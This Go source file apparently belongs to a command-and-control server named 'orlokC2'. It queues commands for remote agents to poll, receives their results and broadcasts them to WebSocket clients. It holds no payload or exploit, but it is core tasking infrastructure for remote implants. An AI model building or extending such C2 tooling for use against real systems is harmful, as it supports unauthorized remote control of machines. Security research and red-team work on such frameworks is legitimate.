package websocket

import (
	"encoding/json"
	"fmt"
	"net/http"
	"orlokC2_final/internal/middleware"
	"sync"
	"time"
)

// In command_handler_euzqrkrx.go
type CommandQueue struct {
	// Queue of commands for any agent
	PendingCommands []string
	mu              sync.Mutex
}

// Global command queue
var AgentCommands = CommandQueue{
	PendingCommands: make([]string, 0),
}

// QueueCommand adds a command to the queue
func (cq *CommandQueue) QueueCommand(command string) {
	cq.mu.Lock()
	defer cq.mu.Unlock()
	cq.PendingCommands = append(cq.PendingCommands, command)
	fmt.Printf("[%s] Command queued: %s\n",
		time.Now().Format("2006-01-02 15:04:05.000"),
		command)
}

// GetCommand retrieves and removes a command from the queue
func (cq *CommandQueue) GetCommand() (string, bool) {
	cq.mu.Lock()
	defer cq.mu.Unlock()

	if len(cq.PendingCommands) == 0 {
		return "", false
	}

	// Get the first command in the queue
	cmd := cq.PendingCommands[0]

	// Remove it from the queue
	cq.PendingCommands = cq.PendingCommands[1:]

	fmt.Printf("[%s] Command retrieved: %s\n",
		time.Now().Format("2006-01-02 15:04:05.000"),
		cmd)

	return cmd, true
}

func CommandEndpoint(w http.ResponseWriter, r *http.Request) {
	fmt.Printf("[%s] Command endpoint hit by agent\n",
		time.Now().Format("2006-01-02 15:04:05.000"))

	// Check if we have a command
	cmd, exists := AgentCommands.GetCommand()

	// Prepare response
	response := struct {
		Command    string `json:"command,omitempty"`
		HasCommand bool   `json:"hasCommand"`
	}{
		HasCommand: exists,
	}

	if exists {
		response.Command = cmd
		fmt.Printf("[%s] Found command: %s\n",
			time.Now().Format("2006-01-02 15:04:05.000"),
			cmd)
	} else {
		fmt.Printf("[%s] No commands available\n",
			time.Now().Format("2006-01-02 15:04:05.000"))
	}

	// Send JSON response
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(response)
}

func ResultEndpoint(w http.ResponseWriter, r *http.Request) {
	// Get the agent UUID from the request context
	agentUUID, _ := r.Context().Value(middleware.AgentUUIDKey).(string)

	fmt.Printf("[%s] Result endpoint hit by agent: %s\n",
		time.Now().Format("2006-01-02 15:04:05.000"),
		agentUUID)

	// Parse the incoming result - use Message type directly
	var result Message
	if err := json.NewDecoder(r.Body).Decode(&result); err != nil {
		http.Error(w, "Invalid request body", http.StatusBadRequest)
		return
	}

	fmt.Printf("[%s] Received result from agent %s:\n  Command: %s\n  Status: %s\n  Output: %s\n",
		time.Now().Format("2006-01-02 15:04:05.000"),
		agentUUID,
		result.Command,
		result.Status,
		result.Output)

	// Forward the result to the WebSocket clients
	if GlobalWSServer != nil {
		// Update the Message with required fields
		result.Type = ResponseMessage
		result.AgentUUID = agentUUID
		if result.Status == "" {
			result.Status = "completed"
		}

		// Broadcast this message directly
		GlobalWSServer.Broadcast(result)

		fmt.Printf("[%s] Broadcasting result from agent %s to all clients\n",
			time.Now().Format("2006-01-02 15:04:05.000"),
			agentUUID)
	}

	// Send acknowledgment - this is the line causing the error
	w.WriteHeader(http.StatusOK)
}
